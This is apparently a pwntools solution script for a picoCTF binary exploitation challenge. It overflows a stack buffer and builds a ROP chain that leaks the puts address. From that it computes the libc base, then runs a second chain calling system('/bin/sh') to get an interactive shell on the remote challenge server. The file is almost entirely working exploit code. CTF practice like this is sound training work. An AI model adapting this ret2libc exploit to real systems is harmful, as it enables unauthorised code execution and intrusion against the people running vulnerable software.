#!/usr/bin/env python3

from pwn import *

# p = process('./vuln_patched')
# gdb.attach(p)

p = remote('mercury.picoctf.net', 1774)

offset = 136
pre_payload = b"A"*offset

pop_rdi_gadget_addr = 0x400913
puts_at_got = 0x601018
puts_at_plt = 0x400540
back_to_main = 0x400771

payload = [
    pre_payload,
    p64(pop_rdi_gadget_addr),
    p64(puts_at_got),
    p64(puts_at_plt),
    p64(back_to_main)
]
payload = b''.join(payload)

p.sendline(payload)
p.recvline() # Ignore unimportant program output
p.recvline()
leak = u64(p.recvline().strip().ljust(8, b"\x00")) # Strip newline, preface bytestring (assume endianness isn't a thing) with null bytes until it is 8 bytes long
log.info(f"{hex(leak)=}")

# scanf_offset = 0x7f6ac03a4f30 - 0x7f6ac0329000
puts_offset = 0x80a30
libc_base_addr = leak-puts_offset
system_offset = 0x4f4e0
system_addr = libc_base_addr + system_offset
binsh_offset = 0x1b40fa
binsh_addr = libc_base_addr + binsh_offset
ret_gadget_addr = 0x40052e
log.info(f"{hex(libc_base_addr)=}")

payload2 = [
    pre_payload,
    p64(pop_rdi_gadget_addr),
    p64(binsh_addr),
    p64(ret_gadget_addr),
    p64(system_addr)
    
]
payload2 = b''.join(payload2)

p.sendline(payload2)

p.interactive()